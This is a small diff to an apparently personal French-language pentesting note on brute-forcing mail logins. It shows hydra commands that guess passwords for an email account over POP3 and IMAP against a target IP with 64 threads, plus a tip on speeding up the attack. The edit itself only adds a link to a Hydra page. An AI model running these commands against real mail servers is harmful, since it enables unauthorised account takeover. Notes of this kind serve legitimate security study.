@@ -16,7 +16,7 @@ hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP pop3 -t 64
 hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP imap -t 64 
 
 ```
-
+Plus d'exemple d'utilisation de l'outil : [[Hydra]]
 ## Augmenter la rapidité de l'attaque
 
 On peut utiliser `-t 64` pour augmenter le nombre de threads
